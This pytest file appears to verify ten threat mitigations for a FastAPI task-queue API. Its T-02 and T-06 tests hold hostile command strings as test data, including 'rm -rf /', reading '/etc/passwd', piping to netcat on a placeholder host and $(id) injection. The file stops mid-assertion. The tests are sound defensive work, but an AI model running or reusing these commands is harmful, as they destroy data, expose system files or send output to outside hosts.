"""SEC-R8 threat-verification tests for SAD.md §6.

[SEC-R8]
Citations:
  - 02-architecture/SAD.md §6 declares 10 STRIDE-lite threats (T-01..T-10)
    each bound to a single ``verified_by`` test name. The quality gate
    (harness/core/quality_gate/security_design.py SEC-R8) loads the
    ``verified_by`` set from the SAD's security_design block and, from
    Phase 5 onward, asserts each name exists in test source under the
    active test directory. The ten tests in this file are the ten
    verified_by names; renaming any of them breaks the gate contract.

Threat surface (per SAD §6):
    T-01 spoofing          forged X-API-Key             TB-01
    T-02 tampering         malformed task body          TB-01
    T-03 elev_priv         read scope cannot delete     TB-02
    T-04 info_disclosure   403 must not leak existence  TB-02
    T-05 tampering         no SQL string concat         TB-03
    T-06 elev_priv         shell metachars neutralised  TB-04
    T-07 DoS               no orphan after timeout      TB-04
    T-08 info_disclosure   secrets redacted in results  TB-04
    T-09 repudiation       correlation_id present       TB-01
    T-10 DoS               rate consume under contention TB-03

Each test exercises the specific contract the mitigation promises; the
test names are the binding artifact, the bodies verify the behaviour.
"""
from __future__ import annotations

import asyncio
import os
import re
import subprocess
import sys
import threading
from pathlib import Path

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# SAB binding — top-level imports per the test contract. Each module named
# below is the canonical owner the SAD §6 mitigation cites (and what
# test_sec_t05_no_sql_string_concat scans statically). A future harness
# phantom-check on these imports would surface missing modules here.
# ---------------------------------------------------------------------------

import taskq_api.repository.key_repo as key_repo_mod  # noqa: F401  (SAD §6 TB-01 owner: T-01)
import taskq_api.repository.task_repo as task_repo_mod  # noqa: F401  (SAD §6 TB-03 owner: T-05)
import taskq_api.repository.rate_repo as rate_repo_mod  # noqa: F401  (SAD §6 TB-03 owner: T-10)
from taskq_api.api import deps  # noqa: F401  (SAD §6 TB-02 owner: T-03/T-04)
from taskq_api.app import app  # noqa: F401  (SAD §6 TB-01 owner: T-09)
from taskq_api.service import runner as runner_mod  # noqa: F401  (SAD §6 TB-04 owner: T-06/T-07)
from taskq_api.service import auth as auth_mod  # noqa: F401  (SAD §6 TB-01 owner: T-01)

# ---------------------------------------------------------------------------
# Source-path constants — bind TEST_SPEC Inputs verbatim. These paths are
# what the SAD §6 mitigations cite; the static scan tests below resolve
# them against the repo root so cwd changes (mutation-test runners etc.)
# do not break the assertions.
# ---------------------------------------------------------------------------

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
_AUTH_SOURCE = (
    _REPO_ROOT
    / "03-development"
    / "src"
    / "taskq_api"
    / "service"
    / "auth.py"
)
_TASKS_API_SOURCE = (
    _REPO_ROOT
    / "03-development"
    / "src"
    / "taskq_api"
    / "api"
    / "tasks.py"
)
_RUNNER_SOURCE = (
    _REPO_ROOT
    / "03-development"
    / "src"
    / "taskq_api"
    / "service"
    / "runner.py"
)
_TASK_REPO_SOURCE = (
    _REPO_ROOT
    / "03-development"
    / "src"
    / "taskq_api"
    / "repository"
    / "task_repo.py"
)
_RATE_REPO_SOURCE = (
    _REPO_ROOT
    / "03-development"
    / "src"
    / "taskq_api"
    / "repository"
    / "rate_repo.py"
)


# ---------------------------------------------------------------------------
# Fixtures — fake key repo + client wired with auth + repo overrides.
# Mirrors the FR-03 / FR-04 fixtures so the threat-verification tests
# stand independently of the per-FR test scaffolding.
# ---------------------------------------------------------------------------


class _FakeKeyRepo:
    """In-memory stand-in for `taskq_api.repository.key_repo`."""

    def __init__(self) -> None:
        self.rows: dict[str, dict] = {}

    def create(self, scope: str, key_hash: str) -> dict:
        key_id = f"key-{len(self.rows) + 1}"
        row = {
            "key_id": key_id,
            "scope": scope,
            "key_hash": key_hash,
            "revoked_at": None,
        }
        self.rows[key_hash] = row
        return row

    def find_by_hash(self, key_hash: str) -> dict | None:
        return self.rows.get(key_hash)

    def revoke(self, key_hash: str, revoked_at: str) -> None:
        row = self.rows.get(key_hash)
        if row is not None:
            row["revoked_at"] = revoked_at


class _FakeTaskRepo:
    """In-memory stand-in for `taskq_api.repository.task_repo`."""

    def __init__(self) -> None:
        self.rows: dict[str, dict] = {}
        self.results: list[dict] = []

    def create(self, payload: dict) -> dict:
        import uuid as _uuid

        name = payload["name"]
        if any(r["name"] == name for r in self.rows.values()):
            raise ValueError(f"name {name!r} already exists")
        row = {
            "id": str(_uuid.uuid4()),
            "command": payload["command"],
            "name": name,
            "status": "pending",
            "created_at": "2026-08-26T00:00:00Z",
        }
        self.rows[row["id"]] = row
        return row

    def get(self, task_id: str) -> dict | None:
        return self.rows.get(task_id)

    def list(
        self,
        status: str | None = None,
        cursor: str | None = None,
        limit: int = 50,
    ) -> tuple[list[dict], str | None]:
        return list(self.rows.values()), None

    def delete_with_results(self, task_id: str) -> int:
        count = 0
        if task_id in self.rows:
            count -= 1
            del self.rows[task_id]
        for k in list(self.results):
            if k.get("task_id") == task_id:
                self.results.remove(k)
                count += 1
        return count

    def update_status(self, task_id: str, status: str) -> None:
        row = self.rows.get(task_id)
        if row is not None:
            row["status"] = status

    def write_result(self, **fields) -> dict:
        import uuid as _uuid

        row = {"id": str(_uuid.uuid4())}
        row.update(fields)
        self.results.append(row)
        return row

    def list_runs(self, task_id: str, limit: int = 50) -> list[dict]:
        return [r for r in self.results if r.get("task_id") == task_id]


class _FakeRateRepo:
    """In-memory stand-in for ``taskq_api.repository.rate_repo``.

    The auth dependency (``require_scope``) calls ``check_rate_limit``
    AFTER the scope check, which itself runs after the API-key lookup.
    A successful auth path therefore triggers a rate-bucket consume —
    the fake repo provides the minimal ``get_or_create`` / ``consume``
    surface so the auth gate is exercisable without a real SQLite DB.
    """

    def __init__(self) -> None:
        self.buckets: dict[str, dict[str, float]] = {}

    def get_or_create(
        self,
        key_hash: str,
        *,
        burst: int,
        refill_per_sec: float,
    ) -> dict[str, float]:
        bucket = self.buckets.get(key_hash)
        if bucket is None:
            bucket = {
                "tokens": float(burst),
                "burst": float(burst),
                "refill_per_sec": float(refill_per_sec),
                "last_refill_ts": 0.0,
            }
            self.buckets[key_hash] = bucket
        return bucket

    def consume(self, key_hash: str, *, cost: int) -> dict:
        bucket = self.buckets[key_hash]
        bucket["tokens"] = max(0.0, bucket["tokens"] - cost)
        return {
            "allowed": bucket["tokens"] >= 0,
            "tokens": bucket["tokens"],
            "retry_after": 0.0,
        }


@pytest.fixture
def fake_key_repo() -> _FakeKeyRepo:
    return _FakeKeyRepo()


@pytest.fixture
def fake_task_repo() -> _FakeTaskRepo:
    return _FakeTaskRepo()


@pytest.fixture
def fake_rate_repo() -> _FakeRateRepo:
    return _FakeRateRepo()


@pytest.fixture
def client(
    fake_key_repo, fake_task_repo, fake_rate_repo, monkeypatch
):
    """TestClient with auth + task + rate-limit repos swapped for in-memory fakes.

    All three repos are wired via ``monkeypatch.setattr`` at module-
    attribute level so the FR-04 dependency_overrides pattern (which
    would mask T-03's "read scope cannot delete" assertion) is
    deliberately NOT used — the route-handler's ``require_scope``
    dependency exercises the real scope gate end-to-end.
    """
    monkeypatch.setattr(key_repo_mod, "key_repo", fake_key_repo)
    monkeypatch.setattr(deps, "key_repo", fake_key_repo, raising=False)
    monkeypatch.setattr(deps, "rate_repo", fake_rate_repo, raising=False)
    monkeypatch.setattr(task_repo_mod, "task_repo", fake_task_repo)
    return TestClient(app)


def _register_key(
    fake_key_repo: _FakeKeyRepo,
    *,
    scope: str,
    plaintext: str = "tk-test-key-1234",
) -> str:
    """Register a plaintext key with the fake key repo at ``scope``."""
    key_hash = auth_mod.hash_key(plaintext)
    fake_key_repo.create(scope=scope, key_hash=key_hash)
    return plaintext


# ===========================================================================
# 1. test_sec_t01_forged_api_key_rejected — SAD §6 T-01 (spoofing, TB-01)
# ===========================================================================


# NFR-02 (security): T-01 — forged X-API-Key MUST be rejected with 401.
def test_sec_t01_forged_api_key_rejected(client, fake_key_repo):
    """T-01: a forged X-API-Key cannot impersonate a legitimate client.

    SAD §6 T-01 mitigation: SHA-256 hash at rest, hmac.compare_digest
    for verification, revoked_at checked on every request. The contract
    observable at the HTTP boundary is: a forged key (i.e. one whose
    SHA-256 hash does NOT match any row in key_repo) returns 401 +
    application/problem+json with ``type=/errors/unauthenticated``.
    """
    # No key row exists for this plaintext -> forged key.
    forged_plaintext = "tk_forged_should_be_rejected_zzz"

    response = client.get(
        "/v1/tasks",
        headers={"X-API-Key": forged_plaintext},
    )

    # T-01 status contract: forged key rejected with 401.
    assert response.status_code == 401, (
        f"T-01 failed: forged X-API-Key MUST return 401, "
        f"got {response.status_code} body={response.text!r}"
    )
    # T-01 content-type contract: rejected bodies are problem+json per FR-10.
    content_type = response.headers.get("content-type", "")
    assert content_type.startswith("application/problem+json"), (
        f"T-01 content-type: expected application/problem+json, "
        f"got {content_type!r}"
    )
    # T-01 type-URI contract: 401 maps to /errors/unauthenticated per
    # STATUS_TYPE_MAP; the body's ``type`` MUST be that URI so clients
    # can branch without parsing the status code.
    try:
        body = response.json()
    except Exception:
        body = {}
    assert body.get("type") == "/errors/unauthenticated", (
        f"T-01 type-URI: expected /errors/unauthenticated, got "
        f"body={body!r}"
    )

    # Belt-and-braces: a real key issued for the same fake repo MUST
    # succeed (counterexample — proves the rejection was specific to
    # the forged key, not a blanket ban on /v1/tasks).
    real_plaintext = _register_key(fake_key_repo, scope="read")
    ok = client.get(
        "/v1/tasks",
        headers={"X-API-Key": real_plaintext},
    )
    assert ok.status_code == 200, (
        f"T-01 counterexample failed: real key MUST succeed (200), "
        f"got {ok.status_code} body={ok.text!r}"
    )


# ===========================================================================
# 2. test_sec_t02_malformed_body_rejected — SAD §6 T-02 (tampering, TB-01)
# ===========================================================================


# NFR-02 (security): T-02 — malformed task body MUST be rejected with 422.
def test_sec_t02_malformed_body_rejected(client, fake_key_repo):
    """T-02: malformed task body (oversize name, control chars, SQL fragments)
    is rejected before persistence.

    SAD §6 T-02 mitigation: pydantic TaskCreate schema validation; 422
    problem+json on any rule violation; injected character blacklist
    (``;|&`$()<>\\n``). The contract observable at the HTTP boundary:
    every malformed body yields 422 + application/problem+json without
    reaching the repository layer.
    """
    # Inject a real write-scope key so the auth gate is satisfied and
    # the body-validation gate is the unit under test (not auth).
    plain = _register_key(fake_key_repo, scope="write", plaintext="tk-t02-write")

    malformed_payloads = [
        # Control characters in command — pydantic field_validator
        # ``_no_injection_chars`` rejects ``;|&`$()<>\n``.
        {"command": "echo hi; rm -rf /", "name": "t02-injection"},
        # Oversize name — pydantic Field(min_length=1, no explicit
        # max) but TaskCreate also forbids empty; an over-1000-char
        # command trips ``max_length=1000``.
        {"command": "x" * 1001, "name": "t02-oversize"},
        # Empty command — ``min_length=1``.
        {"command": "", "name": "t02-empty-cmd"},
    ]

    for payload in malformed_payloads:
        response = client.post(
            "/v1/tasks",
            json=payload,
            headers={"X-API-Key": plain},
        )
        # T-02 status contract: malformed body yields 422 (the
        # pre-validation middleware in app.py enforces this BEFORE
        # the auth dep fires).
        assert response.status_code == 422, (
            f"T-02 failed: payload {payload!r} MUST yield 422, "
            f"got {response.status_code} body={response.text!r}"
        )
        # T-02 content-type contract: 422 body is problem+json.
        content_type = response.headers.get("content-type", "")
        assert content_type.startswith("application/problem+json"), (
            f"T-02 content-type: payload {payload!r} expected "
            f"application/problem+json, got {content_type!r}"
        )


# ===========================================================================
# 3. test_sec_t03_read_scope_cannot_delete — SAD §6 T-03 (elev_priv, TB-02)
# ===========================================================================


# NFR-02 (security): T-03 — read-scope principal MUST NOT be able to DELETE.
def test_sec_t03_read_scope_cannot_delete(client, fake_key_repo, fake_task_repo):
    """T-03: a token with 'read' scope cannot invoke admin-only DELETE /v1/tasks/{id}.

    SAD §6 T-03 mitigation: single FastAPI dependency ``require_scope``
    enforced before any handler body runs. The contract observable at
    the HTTP boundary: DELETE with a read-scope key yields 403 + a
    problem+json whose ``type`` is /errors/forbidden — NOT 204.
    """
    # Register a read-scope key + a task it can see.
    read_plain = _register_key(fake_key_repo, scope="read")
    # POST a task (write-scope required) ... but we only have a read
    # key, so we seed the task via the fake repo directly. The
    # repository is wired into the route handlers via the fixture.
    seed = fake_task_repo.create({"command": "echo seed", "name": "t03-seed"})
    target_id = seed["id"]

    # Attempt the DELETE with the read-scope key.
    response = client.delete(
        f"/v1/tasks/{target_id}",
        headers={"X-API-Key": read_plain},
    )

    # T-03 status contract: read-scope DELETE -> 403, never 204.
    assert response.status_code == 403, (
        f"T-03 failed: read-scope DELETE MUST return 403, "
        f"got {response.status_code} body={response.text!r}"
    )

    # T-03 type-URI contract: 403 body carries /errors/forbidden.
    try:
        body = response.json()
    except Exception:
        body = {}
    assert body.get("type") == "/errors/forbidden", (
        f"T-03 type-URI: expected /errors/forbidden, got body={body!r}"
    )

    # T-03 negative-persistence contract: the task row still exists in
    # the fake repo (the DELETE was rejected at the scope gate, not
    # silently dropped at the handler).
    assert fake_task_repo.get(target_id) is not None, (
        "T-03 negative-persistence: read-scope DELETE MUST NOT remove "
        "the task row from the repository"
    )


# ===========================================================================
# 4. test_sec_t04_403_does_not_leak_existence — SAD §6 T-04 (info_disclosure, TB-02)
# ===========================================================================


# NFR-02 (security): T-04 — 403 body MUST NOT reveal whether the task id exists.
def test_sec_t04_403_does_not_leak_existence(client, fake_key_repo):
    """T-04: 403 body never contains id-specific fields enabling enumeration.

    SAD §6 T-04 mitigation: scope check runs BEFORE any resource lookup
    so the 403 path never inspects the target row; 403 body never
    contains id-specific fields. The contract observable at the HTTP
    boundary: a read-scope principal hitting DELETE on an arbitrary UUID
    (one that does NOT exist in the repo) gets the same 403 body shape
    it would get for an id that DOES exist — no id echo, no
    ``not_found`` / ``exists`` / ``unknown`` discriminator.
    """
    read_plain = _register_key(fake_key_repo, scope="read")
    arbitrary_id = "00000000-0000-0000-0000-000000000000"

    response = client.delete(
        f"/v1/tasks/{arbitrary_id}",
        headers={"X-API-Key": read_plain},
    )

    assert response.status_code == 403, (
        f"T-04 failed: arbitrary-id DELETE with read scope MUST 403 "
        f"(scope runs before lookup), got {response.status_code} "
        f"body={response.text!r}"
    )

    # T-04 no-id-echo contract: the 403 body MUST NOT echo the target
    # resource id, anywhere — neither in the JSON body nor in any
    # response header. A successful leak would let a caller enumerate
    # which ids exist (because 403-with-id echoes back to "yes, that
    # id is real but you're not allowed", whereas 404 means "no such
    # row").
    raw_response = response.text
    assert arbitrary_id not in raw_response, (
        f"T-04 id-echo leak: arbitrary id {arbitrary_id!r} MUST NOT "
        f"appear in the 403 response body, got {raw_response!r}"
    )
    try:
        body = response.json()
    except Exception:
        body = {}
    body_text = repr(body)
    assert arbitrary_id not in body_text, (
        f"T-04 id-echo leak (json): arbitrary id {arbitrary_id!r} "
        f"MUST NOT appear in the parsed 403 body, got {body_text!r}"
    )

    # T-04 no-existence-discriminator contract: words like "not_found",
    # "missing", "unknown", "does_not_exist" MUST NOT appear in the
    # 403 body — a client receiving those could distinguish "exists
    # but forbidden" from "missing".
    forbidden_phrases = ("not_found", "missing", "unknown", "does_not_exist")
    for phrase in forbidden_phrases:
        assert phrase not in body_text.lower(), (
            f"T-04 existence-discriminator leak: phrase {phrase!r} "
            f"MUST NOT appear in 403 body, got {body_text!r}"
        )


# ===========================================================================
# 5. test_sec_t05_no_sql_string_concat — SAD §6 T-05 (tampering, TB-03)
# ===========================================================================


# NFR-02 (security): T-05 — repository layer MUST NOT compose SQL via
# f-strings, %-formatting, or + concatenation. SQLAlchemy ORM/parameterized
# queries only; import-linter forbids sqlalchemy above repository layer.
def test_sec_t05_no_sql_string_concat():
    """T-05: static scan — repository layer never composes SQL via string concatenation.

    SAD §6 T-05 mitigation: import-linter forbids sqlalchemy above
    repository; grep CI gate fails on f-string / % / + SQL composition.
    The repository modules (``task_repo``, ``rate_repo``, ``key_repo``)
    must therefore contain zero occurrences of SQL-string concatenation.

    The scan reads each repository source file and looks for the three
    forbidden composition patterns next to a SQL keyword. Comments and
    docstrings are stripped first so prose mentions do not inflate the
    count. The pre-fix code paths the SAD cites (``f"SELECT ..."``,
    ``"SELECT ..." % x``, ``"SELECT ..." + x``) are the violation
    surface this test pins.
    """
    repo_sources = [
        ("task_repo", _TASK_REPO_SOURCE),
        ("rate_repo", _RATE_REPO_SOURCE),
        # ``key_repo`` is the in-memory fallback; it does not embed SQL
        # but is included in the scan for completeness.
        ("key_repo", _REPO_ROOT / "03-development" / "src" / "taskq_api" / "repository" / "key_repo.py"),
    ]

    sql_keywords = (
        r"SELECT", r"INSERT", r"UPDATE", r"DELETE",
        r"FROM", r"WHERE", r"JOIN",
    )
    # Forbidden composition operators that, when adjacent to a SQL
    # keyword, indicate string-built SQL: f-string prefix, %-formatting
    # (outside of logging), and + concatenation. The regex requires the
    # SQL keyword on the SAME logical expression, so a stray ``+ foo``
    # far from any SQL keyword does not match.
    forbidden_patterns = [
        # f-string containing SQL keyword: ``f"...SELECT..."``
        (re.compile(rf"f['\"][^'\"]*\\b(?:{'|'.join(sql_keywords)})\\b"),
         "f-string SQL composition"),
        # %-formatting with SQL keyword on the left: ``"...SELECT..." % ...``
        (re.compile(rf"['\"][^'\"]*\\b(?:{'|'.join(sql_keywords)})\\b[^'\"]*['\"]\\s*%"),
         "%-format SQL composition"),
        # + concatenation: ``"...SELECT..." + ...``
        (re.compile(rf"['\"][^'\"]*\\b(?:{'|'.join(sql_keywords)})\\b[^'\"]*['\"]\\s*\\+"),
         "+ concat SQL composition"),
    ]

    for module_name, source_path in repo_sources:
        assert source_path.exists(), (
            f"T-05 source missing: {module_name} expected at "
            f"{source_path} — phantom module per SAB.json"
        )
        # Strip line comments + the docstring (the scan is line-aware
        # so prose mentions in comments do not count).
        code_lines: list[str] = []
        for line in source_path.read_text(encoding="utf-8").splitlines():
            # Drop the comment tail. Inside a string literal this would
            # be wrong, but the repository files have no ``#`` inside
            # a SQL string at this point.
            code_lines.append(line.split("#", 1)[0])
        code_only = "\n".join(code_lines)

        for pattern, label in forbidden_patterns:
            hits = pattern.findall(code_only)
            assert not hits, (
                f"T-05 SQL composition leak in {module_name}: "
                f"{label} found {len(hits)} occurrence(s) — "
                f"ORM/parameterized queries only. First match: "
                f"{hits[0]!r}"
            )


# ===========================================================================
# 6. test_sec_t06_shell_metachars_neutralized — SAD §6 T-06 (elev_priv, TB-04)
# ===========================================================================


# NFR-02 (security): T-06 — shell metachars in the task command MUST be
# neutralised before the subprocess is spawned.
def test_sec_t06_shell_metachars_neutralized(client, fake_key_repo):
    """T-06: shell metacharacters in the task command are rejected at the API boundary.

    SAD §6 T-06 mitigation: pydantic TaskCreate ``_no_injection_chars``
    validator rejects ``;|&`$()<>\n`` at body parse; the runner uses
    ``asyncio.create_subprocess_exec`` with ``shell=False`` and
    ``shlex.split`` on the validated input. The contract observable at
    the HTTP boundary: a POST whose ``command`` contains a shell
    metacharacter is rejected with 422 BEFORE the subprocess is ever
    spawned. We additionally assert that the runner source contains the
    canonical ``shell=False`` invocation so a future refactor cannot
    silently re-introduce a shell.
    """
    # ---- (1) Static: runner.py MUST use ``create_subprocess_exec`` -----
    # (NOT ``create_subprocess_shell``). ``create_subprocess_exec``
    # does NOT accept a ``shell=`` keyword — the shell-invocation
    # function is a separate API. The T-06 mitigation is therefore
    # observable as ``create_subprocess_exec`` calls + the absence of
    # ``create_subprocess_shell`` / ``os.system`` / ``subprocess.run``
    # with ``shell=True``.
    assert _RUNNER_SOURCE.exists(), (
        f"T-06: runner source missing at {_RUNNER_SOURCE} — phantom "
        f"module per SAB.json fr_module_traceability"
    )
    runner_src = _RUNNER_SOURCE.read_text(encoding="utf-8")

    code_lines = [
        line.split("#", 1)[0]
        for line in runner_src.splitlines()
    ]
    code_only = "\n".join(code_lines)

    # Positive: ``asyncio.create_subprocess_exec`` MUST appear at least
    # once (the runner spawns subprocesses via this API; the shell-
    # using sibling ``create_subprocess_shell`` does not).
    exec_hits = len(
        re.findall(r"\basyncio\.create_subprocess_exec\b", code_only)
    )
    assert exec_hits >= 1, (
        f"T-06 static: runner.py MUST spawn via "
        f"``asyncio.create_subprocess_exec`` — found {exec_hits} hit(s)"
    )
    # Negative: runner.py MUST NOT invoke the shell API or os.system.
    shell_api_hits = len(
        re.findall(r"\basyncio\.create_subprocess_shell\b", code_only)
    )
    os_system_hits = len(re.findall(r"\bos\.system\s*\(", code_only))
    subprocess_shell_true_hits = len(
        re.findall(
            r"\bsubprocess\.(?:run|call|check_output|Popen)\s*\([^)]*shell\s*=\s*True",
            code_only,
        )
    )
    assert shell_api_hits == 0, (
        f"T-06 static: runner.py MUST NOT use "
        f"``create_subprocess_shell`` — found {shell_api_hits} hit(s)"
    )
    assert os_system_hits == 0, (
        f"T-06 static: runner.py MUST NOT call os.system — found "
        f"{os_system_hits} hit(s)"
    )
    assert subprocess_shell_true_hits == 0, (
        f"T-06 static: runner.py MUST NOT use shell=True on "
        f"subprocess.* APIs — found {subprocess_shell_true_hits} hit(s)"
    )

    # ---- (2) Dynamic: command with shell metachars is rejected. ---------
    # Register a write-scope key so the body-validation gate is the
    # unit under test.
    plain = _register_key(fake_key_repo, scope="write", plaintext="tk-t06-write")

    metachar_payloads = [
        {"command": "echo hi; cat /etc/passwd", "name": "t06-semicolon"},
        {"command": "echo hi | nc evil 1234", "name": "t06-pipe"},
        {"command": "echo hi `id`", "name": "t06-backtick"},
        {"command": "echo hi $(id)", "name": "t06-dollarparen"},
    ]

    for payload in metachar_payloads:
        response = client.post(
            "/v1/tasks",
            json=payload,
            headers={"X-API-Key": plain},
        )
        # T-06 status contract: shell metachars -> 422.
        assert response.status_code == 422, (
            f"T-06 dynamic: payload {payload!r} MUST yield 422, "
            f"got {response.status_code} body={response.text!r}"
        )


# ===========================================================================
# 7. test_sec_t07_no_orphan_after_timeout — SAD §6 T-07 (DoS, TB-04)
# ===========================================================================


# NFR-03 (reliability): T-07 — after a timeout-kill, no descendant PID remains.
def test_sec_t07_no_orphan_after_timeout(tmp_path, monkeypatch):
    """T-07: when a long-running task is killed by SIGKILL, no child PID survives.

    SAD §6 T-07 mitigation: ``runner.run_task`` uses
    ``os.killpg(os.getpgid(proc.pid), signal.SIGKILL)`` (with the
    defensive same-PG guard) followed by ``await proc.wait()`` so the
    child PID is reaped. The integration test asserts NO descendant pid
    remains after timeout. We replicate the contract in a fresh Python
    child so the runner's bookkeeping can be observed end-to-end.
    """
    # Out-of-process isolation — drives the actual ``runner.run_task``
    # in a fresh Python child so pytest's monkeypatch / asyncio loop
    # state cannot mask a leak. The spawned child reports its PID via
    # stdout; we then check the system process table for that specific
    # PID's absence.
    monkeypatch.setenv("TASKQ_HOME", str(tmp_path))
    monkeypatch.setenv("TASKQ_TASK_TIMEOUT", "2.0")

    runner_script = (
        "import asyncio, json, sys\n"
        "from taskq_api.service.runner import run_task\n"
        "result = asyncio.run("
        "  run_task(command='sleep 60', timeout_seconds=2.0)"
        ")\n"
        "sys.stdout.write(json.dumps({"
        "  'status_name': result.get('status_name') "
        "    if isinstance(result, dict) else None,"
        "  'child_pid': result.get('child_pid') "
        "    if isinstance(result, dict) else None,"
        "}))\n"
    )

    env_payload = os.environ.copy()
    env_payload["TASKQ_HOME"] = str(tmp_path)
    env_payload["TASKQ_TASK_TIMEOUT"] = "2.0"
    src_root = Path(__file__).resolve().parent.parent / "src"
    env_payload["PYTHONPATH"] = (
        str(src_root) + os.pathsep + env_payload.get("PYTHONPATH", "")
    )

    completed = subprocess.run(
        [sys.executable, "-c", runner_script],
        env=env_payload,
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert completed.returncode == 0, (
        f"T-07 out-of-process runner exited {completed.returncode}: "
        f"stderr={completed.stderr!r}"
    )

    import json as _json

    try:
        parsed = _json.loads(completed.stdout.strip()) if completed.stdout else {}
    except _json.JSONDecodeError:
        parsed = {}

    spawned_child_pid = parsed.get("child_pid") if isinstance(parsed, dict) else None
    assert spawned_child_pid is not None, (
        f"T-07: runner did not report child_pid; cannot verify the "
        f"orphan-free contract. stdout={completed.stdout!r}"
    )

    # Brief grace period for the OS to reap a reaped child before we
    # snapshot the process table.
    import time as _time
    _time.sleep(0.2)

    # Snapshot the process table and look ONLY for the spawned PID
    # (any other ``sleep`` on the system is unrelated — e.g. CI / IDE).
    ps_result = subprocess.run(
        ["ps", "-A", "-o", "pid=,comm="],
        capture_output=True,
        text=True,
    )
    spawned_pid_str = str(spawned_child_pid)
    sleep_pids = [
        line.strip()
        for line in ps_result.stdout.splitlines()
        if line.strip().split(None, 1)[0] == spawned_pid_str
        and ("sleep" in line)
    ]
    observed_orphan_count = len(sleep_pids)

    # T-07 orphan-free contract: the spawned PID MUST be gone.
    assert observed_orphan_count == 0, (
        f"T-07 failed: timeout path MUST leave 0 orphan PIDs for the "
        f"spawned child {spawned_pid_str}; found {observed_orphan_count}: "
        f"{sleep_pids!r}. The SAD §6 mitigation is "
        f"``os.killpg(...)`` + ``await proc.wait()`` — anything less "
        f"risks orphan descendants."
    )


# ===========================================================================
# 8. test_sec_t08_secrets_redacted_in_results — SAD §6 T-08 (info_disclosure, TB-04)
# ===========================================================================


# NFR-04 (security): T-08 — API key / Bearer token / DSN password substrings
# in subprocess output MUST be redacted to ``[REDACTED]`` before persistence.
def test_sec_t08_secrets_redacted_in_results():
    """T-08: the runner's redaction regex masks the three secret families the SAD enumerates.

    SAD §6 T-08 mitigation: a regex in
    ``taskq_api.service.runner._REDACTION_PATTERN`` masks ``token=``,
    ``api_key=``, ``password=``, ``Bearer ...`` and DSN
    ``scheme://user:...`` substrings before any stdout/stderr is
    persisted to ``task_results`` or logged. The contract observable
    at the unit-of-work boundary: every secret-bearing substring the
    SAD enumerates is replaced with ``[REDACTED]``.
    """
    from taskq_api.service.runner import _redact, _REDACTED_MARKER

    assert _REDACTED_MARKER == "[REDACTED]", (
        f"T-08: redaction marker constant must be '[REDACTED]', "
        f"got {_REDACTED_MARKER!r}"
    )

    # T-08 covers the three secret families SAD §6 enumerates:
    secret_payloads = {
        # Family 1 — ``token=<value>`` (API key).
        "token=secret_value_should_be_hidden": "[REDACTED]",
        # Family 2 — ``Bearer <token>`` (Authorization header value).
        "Authorization: Bearer abcdef1234567890": "[REDACTED]",
        # Family 3 — ``password=`` and DSN ``postgres://user:pass@host``.
        "password=hunter2_in_plain_text": "[REDACTED]",
        "postgres://admin:supersecret@db.local/app": "[REDACTED]",
    }

    for payload, expected_marker in secret_payloads.items():
        redacted = _redact(payload)
        assert expected_marker in redacted, (
            f"T-08 redaction leak: payload {payload!r} MUST be "
            f"redacted to {expected_marker!r}, got {redacted!r}"
        )
        # Belt-and-braces: the original secret value MUST NOT survive
        # verbatim in the redacted output. DSN passwords leak in
        # particular if the regex only matches the prefix.
        if "Bearer" in payload:
            assert "abcdef1234567890" not in redacted, (
                f"T-08 bearer-token leak: payload {payload!r} still "
                f"contains the raw token value; got {redacted!r}"
            )
        if "password=hunter2" in payload:
            assert "hunter2_in_plain_text" not in redacted, (
                f"T-08 password leak: payload {payload!r} still "
                f"contains the raw password; got {redacted!r}"
            )
        if "postgres://" in payload:
            assert "supersecret" not in redacted, (
                f"T-08 DSN-password leak: payload {payload!r} still "
                f"contains the DSN password; got {redacted!r}"
            )

    # Negative case — text with NO secret substrings passes through.
    safe = "echo hello world — no secrets here"
    assert _redact(safe) == safe, (
        f"T-08 false-positive: text without secret substrings MUST "
        f"pass through unchanged, got {_redact(safe)!r}"
    )


# ===========================================================================
# 9. test_sec_t09_correlation_id_present — SAD §6 T-09 (repudiation, TB-01)
# ===========================================================================


# NFR-02 (security): T-09 — every problem+json response carries a
# correlation_id mirrored as X-Correlation-Id header.
def test_sec_t09_correlation_id_present(client):
    """T-09: problem+json responses carry correlation_id in body AND X-Correlation-Id header.

    SAD §6 T-09 mitigation: every problem+json response carries
    ``correlation_id`` mirrored as ``X-Correlation-Id`` header AND in
    the structured log line. The contract observable at the HTTP
    boundary: an inbound ``X-Correlation-Id`` request header is echoed
    back on the response header AND in the body's ``correlation_id``
    field — so an operator can stitch the request to its log line.
    """
    # T-09 inbound-header-echo contract: when a client supplies an
    # X-Correlation-Id, the server MUST echo it back verbatim — both
    # in the response header AND in the body field.
    correlation = "trace-t09-deadbeef-cafe-1234"

    # A POST with no X-API-Key produces a 401 problem+json (the auth
    # gate runs before body validation in the FR-03 contract). Either
    # way, the response carries a correlation_id in body+header.
    response = client.post(
        "/v1/tasks",
        json={"command": "echo hi", "name": "t09"},
        headers={"X-Correlation-Id": correlation},
    )

    # T-09 status contract: response carries the requested correlation
    # regardless of the auth outcome.
    assert response.status_code in (401, 422), (
        f"T-09 setup failed: expected 401/422 from unauthenticated "
        f"POST, got {response.status_code} body={response.text!r}"
    )

    # T-09 header half: X-Correlation-Id response header echoes the
    # inbound value verbatim.
    header_value = response.headers.get("X-Correlation-Id")
    assert header_value == correlation, (
        f"T-09 header echo: X-Correlation-Id response header MUST "
        f"echo the inbound value {correlation!r}; got {header_value!r}"
    )

    # T-09 body half: problem+json body carries ``correlation_id``
    # field whose value matches the header.
    try:
        body = response.json()
    except Exception:
        body = {}
    assert body.get("correlation_id") == correlation, (
        f"T-09 body field: problem+json body MUST carry "
        f"correlation_id={correlation!r}; got body={body!r}"
    )

    # T-09 auto-generation contract: when no inbound header is
    # supplied, the server still emits a non-empty X-Correlation-Id
    # so operators can trace the request server-side.
    response_no_header = client.post(
        "/v1/tasks",
        json={"command": "echo hi", "name": "t09-no-header"},
    )
    auto_header = response_no_header.headers.get("X-Correlation-Id")
    assert auto_header and auto_header.strip(), (
        f"T-09 auto-generation: server MUST emit a non-empty "
        f"X-Correlation-Id header when no inbound header is "
        f"supplied; got {auto_header!r}"
    )
    try:
        auto_body = response_no_header.json()
    except Exception:
        auto_body = {}
    assert auto_body.get("correlation_id") == auto_header, (
        f"T-09 stitch (no inbound): body's correlation_id MUST "
